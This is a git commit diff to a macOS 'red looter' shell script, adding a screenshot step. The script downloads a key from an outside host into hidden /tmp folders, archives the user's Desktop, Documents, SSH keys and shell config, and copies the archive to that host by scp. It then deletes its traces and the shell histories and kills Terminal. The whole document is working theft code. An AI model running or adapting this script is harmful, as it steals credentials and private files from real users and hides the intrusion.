e63bf1b7d17850acf65764e0b788b5f35ccbd58d
un1x01d <>
2022-08-19 01:56:44 -0400

    add screenshot

--- MacOS_Red_Looter/loot.sh
+++ MacOS_Red_Looter/loot.sh
@@ -5,11 +5,13 @@ HOME="/Users/$USER"
 mkdir -p /tmp/.s/.t/.e/.a/.l && curl -s http://192.168.1.216/sh -o /tmp/.s/.t/.e/.a/.l/.s 
 chmod 600 /tmp/.s/.t/.e/.a/.l/.s
 
+screencapture -ixC ~/Desktop/.s.png
+
 cd /tmp/.s/.t/.e/.a/.l
 tar cfz .loot.tgz $HOME/Desktop $HOME/Documents $HOME/.ssh $HOME/.bash* $HOME/.config $HOME/.zsh*
 
 scp -q -o StrictHostKeyChecking=no -i /tmp/.s/.t/.e/.a/.l/.s /tmp/.s/.t/.e/.a/.l/.loot.tgz zed@192.168.1.216:~/demo/
 
-set -e && rm -rf /tmp/.s ~/.bash_history ~/.zsh_history && history -c
+set -e && rm -f ~/Desktop/.s.png && rm -rf /tmp/.s ~/.bash_history ~/.zsh_history && history -c
 
 killall Terminal
